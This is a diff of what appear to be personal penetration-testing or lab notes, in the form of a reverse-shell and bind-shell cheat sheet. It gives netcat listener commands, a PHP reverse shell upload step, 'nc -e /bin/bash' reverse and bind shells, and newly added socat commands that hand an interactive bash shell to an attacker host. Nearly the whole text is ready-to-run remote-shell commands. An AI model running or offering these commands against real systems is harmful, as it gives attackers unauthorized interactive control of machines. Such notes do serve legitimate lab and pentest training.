@@ -1027,13 +1027,20 @@ p2
 - ``` nc -lnvp 1234 ``` on attacker.
 - upload ``` php-reverse-shell.php ``` to server and run it.
 
-p3(REVERSE SHELL)
+p3(nc REVERSE SHELL)
 - ``` nc -lvnp 4444 ``` attacker’s 
 - ``` nc <tun0-ip> 4444-e /bin/bash ``` target’s 
 
-p3(BIND SHELL)
+p3(nc BIND SHELL)
 - ``` nc  -lvnp 4444-e /bin/bash ``` target’s terminal
 - ``` nc <target-ip> 4444 ``` attacker’s terminal
 
-p4
-- 
+p4(socat reverse shell)
+- ``` socat TCP-L:4444 - ``` attacker`s
+- ``` socat TCP:<tun0-ip>:4444 EXEC:"bash -li" ``` target`s
+
+p4(socat bind shell)
+- ``` socat TCP-L:4444 EXEC:"bash -li" ``` target`s
+- ``` socat TCP:<ip>:4444 - ``` attacker`s
+
+
